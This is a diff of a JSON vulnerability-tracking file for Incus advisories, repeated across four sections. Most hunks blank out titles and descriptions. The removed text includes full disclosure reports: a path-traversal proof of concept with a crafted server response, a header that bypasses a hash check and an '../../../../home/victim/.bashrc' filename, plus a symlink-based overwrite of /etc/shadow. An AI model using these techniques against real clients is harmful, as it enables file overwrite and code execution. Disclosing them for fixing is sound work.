@@ -668,8 +668,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -692,8 +692,8 @@
             },
             "CVE-2026-81494": {
                 "cve_id": "CVE-2026-81494",
-                "title": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-plan",
-                "description": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -740,8 +740,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -764,8 +764,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -812,8 +812,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -836,8 +836,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -1028,8 +1028,8 @@
             },
             "GHSA-wfvq-qh87-gm4j": {
                 "cve_id": "GHSA-wfvq-qh87-gm4j",
-                "title": "Incus CLI arbitrary file write via malicious incus-agent during recursive file pull",
-                "description": "### Summary `incus file pull -r` copies a directory tree out of a virtual machine over SFTP, served by `incus-agent` running inside the guest. The client trusted the agent's directory listing and `Lstat` results without accounting for the fact that a compromised agent can make them inconsistent. A malicious agent can return the same entry name twice, report it as a symlink on the first visit and as a directory or regular file on the second. The client creates the symlink on the first visit and, on the second, recurses into or writes through it, escaping the local target directory. ### Impact An attacker with root inside a virtual machine, running a modified `incus-agent`, can make an operator who runs `incus file pull -r` from that virtual machine write attacker-controlled files, or whole directory trees, to arbitrary paths on the machine running the `incus` CLI, with the operator's privileges. When run as root this allows overwriting files such as `/etc/shadow` or `/root/.ssh/authorized_keys`. The operator has to run a recursive pull from the compromised virtual machine; no other interaction is needed. Containers are not affected as their file transfers are served by `forkfile` on the host rather than by an in-guest agent. ### Details `sftpRecursivePullFile` in `cmd/incus/utils_sftp.go` iterates over the entries returned by `ReadDir`, calls `Lstat` on each and creates the matching local file, directory or symlink under the target. Nothing stopped a later entry from resolving to a path that the transfer itself had just created as a symlink: `os.Mkdir`/`os.Create` follow it, so the 'directory' or 'file' lands wherever the symlink points. ### Workarounds Avoid `incus file pull -r` from untrusted virtual machines, or run it as an unprivileged user into a dedicated directory.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -1052,8 +1052,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Restricted client can read storage bucket keys in the default project",
+                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1742,8 +1742,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1766,8 +1766,8 @@
             },
             "CVE-2026-81494": {
                 "cve_id": "CVE-2026-81494",
-                "title": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-plan",
-                "description": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1814,8 +1814,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1838,8 +1838,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1886,8 +1886,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -1910,8 +1910,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -2102,8 +2102,8 @@
             },
             "GHSA-wfvq-qh87-gm4j": {
                 "cve_id": "GHSA-wfvq-qh87-gm4j",
-                "title": "Incus CLI arbitrary file write via malicious incus-agent during recursive file pull",
-                "description": "### Summary `incus file pull -r` copies a directory tree out of a virtual machine over SFTP, served by `incus-agent` running inside the guest. The client trusted the agent's directory listing and `Lstat` results without accounting for the fact that a compromised agent can make them inconsistent. A malicious agent can return the same entry name twice, report it as a symlink on the first visit and as a directory or regular file on the second. The client creates the symlink on the first visit and, on the second, recurses into or writes through it, escaping the local target directory. ### Impact An attacker with root inside a virtual machine, running a modified `incus-agent`, can make an operator who runs `incus file pull -r` from that virtual machine write attacker-controlled files, or whole directory trees, to arbitrary paths on the machine running the `incus` CLI, with the operator's privileges. When run as root this allows overwriting files such as `/etc/shadow` or `/root/.ssh/authorized_keys`. The operator has to run a recursive pull from the compromised virtual machine; no other interaction is needed. Containers are not affected as their file transfers are served by `forkfile` on the host rather than by an in-guest agent. ### Details `sftpRecursivePullFile` in `cmd/incus/utils_sftp.go` iterates over the entries returned by `ReadDir`, calls `Lstat` on each and creates the matching local file, directory or symlink under the target. Nothing stopped a later entry from resolving to a path that the transfer itself had just created as a symlink: `os.Mkdir`/`os.Create` follow it, so the 'directory' or 'file' lands wherever the symlink points. ### Workarounds Avoid `incus file pull -r` from untrusted virtual machines, or run it as an unprivileged user into a dedicated directory.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -2126,8 +2126,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Restricted client can read storage bucket keys in the default project",
+                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -2798,8 +2798,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2819,8 +2819,8 @@
             },
             "CVE-2026-81494": {
                 "cve_id": "CVE-2026-81494",
-                "title": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-plan",
-                "description": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2861,8 +2861,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2882,8 +2882,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -2924,8 +2924,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -2945,8 +2945,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -3113,8 +3113,8 @@
             },
             "GHSA-wfvq-qh87-gm4j": {
                 "cve_id": "GHSA-wfvq-qh87-gm4j",
-                "title": "Incus CLI arbitrary file write via malicious incus-agent during recursive file pull",
-                "description": "### Summary `incus file pull -r` copies a directory tree out of a virtual machine over SFTP, served by `incus-agent` running inside the guest. The client trusted the agent's directory listing and `Lstat` results without accounting for the fact that a compromised agent can make them inconsistent. A malicious agent can return the same entry name twice, report it as a symlink on the first visit and as a directory or regular file on the second. The client creates the symlink on the first visit and, on the second, recurses into or writes through it, escaping the local target directory. ### Impact An attacker with root inside a virtual machine, running a modified `incus-agent`, can make an operator who runs `incus file pull -r` from that virtual machine write attacker-controlled files, or whole directory trees, to arbitrary paths on the machine running the `incus` CLI, with the operator's privileges. When run as root this allows overwriting files such as `/etc/shadow` or `/root/.ssh/authorized_keys`. The operator has to run a recursive pull from the compromised virtual machine; no other interaction is needed. Containers are not affected as their file transfers are served by `forkfile` on the host rather than by an in-guest agent. ### Details `sftpRecursivePullFile` in `cmd/incus/utils_sftp.go` iterates over the entries returned by `ReadDir`, calls `Lstat` on each and creates the matching local file, directory or symlink under the target. Nothing stopped a later entry from resolving to a path that the transfer itself had just created as a symlink: `os.Mkdir`/`os.Create` follow it, so the 'directory' or 'file' lands wherever the symlink points. ### Workarounds Avoid `incus file pull -r` from untrusted virtual machines, or run it as an unprivileged user into a dedicated directory.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -3134,8 +3134,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Restricted client can read storage bucket keys in the default project",
+                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -3785,8 +3785,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -3803,8 +3803,8 @@
             },
             "CVE-2026-81494": {
                 "cve_id": "CVE-2026-81494",
-                "title": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-plan",
-                "description": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -3839,8 +3839,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -3857,8 +3857,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -3893,8 +3893,8 @@
             },
             "CVE-2026-81499": {
